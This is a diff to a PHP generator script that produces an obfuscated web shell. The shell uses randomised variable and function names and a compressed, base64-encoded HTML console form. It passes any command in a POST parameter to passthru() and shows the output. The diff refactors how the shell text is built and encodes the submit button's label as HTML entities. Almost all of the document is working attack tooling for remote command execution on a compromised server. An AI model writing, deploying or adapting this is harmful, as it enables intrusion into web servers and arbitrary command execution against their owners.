@@ -6,7 +6,6 @@ if ( ! isset($_SERVER['TERM'])){
     header('Content-Type: text/plain');
 }
 
-
 function make_random_name(){
     // making some randomness
     $name = rand() * rand();
@@ -24,10 +23,9 @@ function make_random_name(){
 $eval_function    = make_random_name();
 $eval_arg         = make_random_name();
 $html_console_tag = make_random_name();
-$post             = make_random_name();
+$post_param       = make_random_name();
 $post_command     = make_random_name();
 $script_name      = make_random_name();
-$page_html        = make_random_name();
 $page_html_var    = make_random_name();
 
 $page_html = <<< EOF
@@ -42,8 +40,8 @@ $page_html = <<< EOF
     </head>
     <body>
         <form action="$script_name" id="form" method="POST">
-            <input type="text" name="$post" autocomplete="off" autofocus>
-            <span> 2&gt;&amp;1 </span><button type="submit">\$\$\$</button>
+            <input type="text" name="$post_param" autocomplete="off" autofocus>
+            <button type="submit">&#x7E;&#x20;&#x66;&#x55;&#x71;&#x31;&#x4E;&#x20;&#x68;&#x34;&#x51;&#x20;&#x74;&#x68;&#x31;&#x7A;&#x5A;&#x5A;&#x7A;&#x20;&#x62;&#x28;&#x29;&#x78;&#x20;&#x7E;</button>
         </form>
     <code>
 <pre>
@@ -51,27 +49,27 @@ EOF;
 
 $page_html = base64_encode(gzdeflate($page_html));
 
-$shell = sprintf('<?php
-$%s = gzinflate(base64_decode("%s"));
 
-function %s($%s){
-    echo "<%s>$ ".$%s."</%s><br>";
-    echo htmlentities(passthru($%s." 2>&1"), ENT_IGNORE);
+$shell = <<< EOF
+<?php
+
+\$$page_html_var = gzinflate(base64_decode("$page_html"));
+
+function $eval_function(\$$eval_arg){
+    echo "<$html_console_tag>\$ ".\$$eval_arg."</$html_console_tag><br>";
+    echo htmlentities(passthru(\$$eval_arg." 2>&1"));
 }
-@$%s=$_POST["%s"];
-echo preg_replace("/%s/", basename($_SERVER["SCRIPT_NAME"]), $%s);
+echo preg_replace("/$script_name/", basename(\$_SERVER["SCRIPT_NAME"]), \$$page_html_var);
 
-if (isset($%s)){
-    %s($%s);
+if (isset(\$_POST["$post_param"])){
+    $eval_function(\$_POST["$post_param"]);
 }
 else {
-    %s("#");
+    $eval_function("#");
 }
 __halt_compiler/*
-*/();',
-$page_html_var, $page_html, $eval_function, $eval_arg, $html_console_tag, $eval_arg, $html_console_tag, 
-$eval_arg, $post_command, $post, $script_name, $page_html_var, $post_command, $eval_function, 
-$post_command, $eval_function);
+*/();
+EOF;
 
 echo $shell;
 
